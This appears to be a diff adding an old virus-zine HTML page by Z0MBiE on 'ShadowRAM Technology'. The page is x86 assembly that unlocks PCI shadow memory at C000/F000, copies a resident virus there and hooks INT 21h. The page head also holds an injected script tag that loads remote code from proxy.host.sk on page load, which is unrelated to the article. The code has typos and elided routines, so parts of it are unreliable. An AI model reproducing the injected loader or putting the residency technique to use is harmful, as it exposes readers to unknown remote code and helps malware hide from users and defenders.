@@ -1,0 +1,314 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+
+<HTML>
+
+  <HEAD>
+     <TITLE>RVM #1: ShadowRAM Tecnnology</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+     <META NAME="Author" CONTENT="Z0MBiE">
+     <META NAME="GENERATOR" CONTENT="Mozilla/3.0Gold (Win16; I) [Netscape]">
+   </HEAD>
+
+  <BODY   bgcolor       ="#FFFFFF"
+          text          ="#000080"
+          link          ="#FF0000"
+          alink         ="#000000"
+          vlink         ="#C00000"
+          >
+
+    <FONT FACE="Courier, Times, Arial, System">
+
+    <P>
+    <H2 align=center>ShadowRAM Technology (c) Z0MBiE</H2>
+    </P>
+
+    <PRE>
+
+ ; ======================== ShadowRAM Map: ============================
+
+ ;   00x? xxxx xxxx xxxx       sh_R  (readable)
+ ;   00x? xxxx xxxx xxxx       sh_W  (writeable)
+ ;   00x? xxxx xxxx xxxx       sh_C  (cacheable)
+ ;   00x? xxxx xxxx xxxx       sh_X  (reserved)
+ ;
+ ;   bit 15: unused (0)
+ ;   bit 14: unused (0)
+ ;   bit 13: F000, 64k
+ ;   bit 12: reserved
+
+ ;   bit 11: C000, 16k
+ ;   bit 10: C400, 16k
+ ;   bit 09: C800, 16k
+ ;   bit 08: CC00, 16k
+
+ ;   bit 07: D000, 16k
+ ;   bit 06: D400, 16k
+ ;   bit 05: D800, 16k
+ ;   bit 04: DC00, 16k
+
+ ;   bit 03: E000, 16k
+ ;   bit 02: E400, 16k
+ ;   bit 01: E800, 16k
+ ;   bit 08: EC00, 16k
+
+ ; ======================== PCI registers manager =====================
+
+ read_cf8:
+ cf8_read:       mov     ax, 8000h
+                 shl     eax, 10h
+                 mov     ax, cx
+                 and     al, not 3
+                 mov     dx, 0CF8h
+                 out     dx, eax
+                 add     dl, 4
+                 mov     al, cl
+                 and     al, 3
+                 add     dl, al
+                 in      al, dx
+                 ret
+
+ write_cf8:
+ cf8_write:      xchg    ax, cx
+                 shl     ecx, 10h
+                 xchg    ax, cx
+                 mov     ax, 8000h
+                 shl     eax, 10h
+                 mov     ax, cx
+                 and     al, not 3
+                 mov     dx, 0CF8h
+                 out     dx, eax
+                 add     dl, 4
+                 mov     al, cl
+                 and     al, 3
+                 add     dl, al
+                 shr     ecx, 10h
+                 mov     ax, cx
+                 out     dx, al
+                 ret
+
+ ; ======================== ShadowRAM manager: ========================
+
+ sh_R            equ     BX
+ sh_W            equ     CX
+ sh_C            equ     DX
+ sh_X            equ     SI
+
+ seg_all         equ     0010111111111111b
+
+ seg_F000_64k    equ     0010000000000000b
+
+ seg_C000_64k    equ     0000111100000000b
+ seg_C000_32k    equ     0000110000000000b
+ seg_C800_32k    equ     0000001100000000b
+ seg_C000_16k    equ     0000100000000000b
+ seg_C400_16k    equ     0000010000000000b
+ seg_C800_16k    equ     0000001000000000b
+ seg_CC00_16k    equ     0000000100000000b
+
+ seg_D000_64k    equ     0000000011110000b
+ seg_D000_32k    equ     0000000011000000b
+ seg_D800_32k    equ     0000000000110000b
+ seg_D000_16k    equ     0000000010000000b
+ seg_D400_16k    equ     0000000001000000b
+ seg_D800_16k    equ     0000000000100000b
+ seg_DC00_16k    equ     0000000000010000b
+
+ seg_E000_64k    equ     0000000000001111b
+ seg_E000_32k    equ     0000000000001100b
+ seg_E800_32k    equ     0000000000000011b
+ seg_E000_16k    equ     0000000000001000b
+ seg_E400_16k    equ     0000000000000100b
+ seg_E800_16k    equ     0000000000000010b
+ seg_EC00_16k    equ     0000000000000001b
+
+ get_sh_state:   mov     di, 0059h
+
+ @@1:            push    cx dx
+                 mov     cx, di
+                 call    cf8_read
+                 pop     dx cx
+
+                 mov     ah, 2
+
+ @@2:            shl     al, 1
+                 rcl     si, 1
+
+                 shl     al, 1
+                 rcl     dx, 1
+
+                 shl     al, 1
+                 rcl     cx, 1
+
+                 shl     al, 1
+                 rcl     bx, 1
+
+                 dec     ah
+                 jnz     @@2
+
+                 inc     di
+                 cmp     di, 005fh
+                 jbe     @@1
+
+                 ret
+
+ set_sh_state:   mov     di, 005Fh
+
+ @@1:            mov     ah, 2
+
+ @@2:            shr     bx, 1
+                 rcr     al, 1
+
+                 shr     cx, 1
+                 rcr     al, 1
+
+                 shr     dx, 1
+                 rcr     al, 1
+
+                 shr     si, 1
+                 rcr     al, 1
+
+                 dec     ah
+                 jnz     @@2
+
+                 push    cx dx
+                 mov     cx, di
+                 call    cf8_write
+                 pop     dx cx
+
+                 dec     di
+                 cmp     di, 0059h
+                 jae     @@1
+
+                 ret
+
+ ; ======================== Example ===================================
+
+ ; Enable write to segments C000 & F000
+
+ enableC000F000:
+                 call    get_sh_state
+                 or      sh_W, seg_C000_32k + seg_F000_64k
+                 cals    set_sh_state
+                 ret
+
+ ; Disable write to segments C000 & F000
+
+ disableC000F000:
+                 call    get_sh_state
+                 and     sh_W, not (seg_C000_32k + seg_F000_64k)
+                 cals    set_sh_state
+                 ret
+
+ ; ======================== TSR in ShadowRAM: Example =================
+
+ ; to compile:   tasm /m filename
+ ;               tlink /t /x filename
+
+                 .model tpascal
+                 .386
+                 .code
+                 assume ds:code
+                 locals @@
+
+                 org 100h
+ start:
+                 mov ax, 0c000h    ; check if alredy resident
+                 xor cx, cx
+                 int 21h
+                 jcxz @@1
+
+ @@exit:         int 20h
+
+ @@1:            mov ax, 3521h
+                 int 21h
+                 mov word ptr old21 + 0, bx
+                 mov word ptr old21 + 2, es
+
+                 mov ax, 1130h     ; es:bp = pointer to font 8x14
+                 mov bh, 02h
+                 int 10h
+
+                 mov ax, es
+                 cmp ax, 0C000h
+                 jne @@exit
+
+                 add bp, 15        ; convert ¢ es:bp to Cxxx:0100h
+                 and bp, 0fff0h
+                 mov ax, es
+                 mov bx, bp
+                 shr bx, 4
+                 add ax, bx
+                 sub ax, 16
+                 mov es, ax
+                 mov bp, 100h
+
+                 call c000_enable  ; enable C000
+
+                 mov di, bp        ; es:di
+
+                 lea si, start     ; write virii to memory
+                 mov cx, codesize
+                 cld
+                 rep movsb
+
+                 call c000_disable ; disable C000
+
+                 mov ax, 2521h     ; set our int
+                 push es
+                 pop ds
+                 lea dx, int21
+                 int 21h
+
+                 int 20h           ; yes!
+
+
+ ; ========================= Another way of ShadowRAM management =======
+
+ f000_enable:    mov cx, 0059h     ; f000, 64k
+                 mov bx, 308fh     ; warning: last 16k used by QEMM !
+                 call cf8_io       ;
+                 ret
+
+ f000_disable:   mov cx, 0059h     ; f000, 64k
+                 mov bx, 108fh
+                 call cf8_io
+                 ret
+
+ c000_enable:    mov cx, 005ah     ; c000, 32k
+                 mov bx, 33cch
+                 call cf8_io
+                 ret
+
+ c000_disable:   mov cx, 005ah     ; c000, 32k
+                 mov bx, 11cch
+                 call cf8_io
+                 ret
+
+ cf8_io:         cli
+                 call cf8_read
+                 and al, bl
+                 or  al, bh
+                 call cf8_write
+                 ret
+
+ cf8_read:       ...
+
+ cf8_write:      ...
+
+                 ; resident part
+
+ tsr:            nop
+
+ int21:          cmp ax, 0c000h
+                 je axc000
+
+                 db 0eah
+ old21           dd ?
+
+ axc000:         inc cx
+                 iret
+
+ codesize        equ $-start
+
+                 end start
+
+
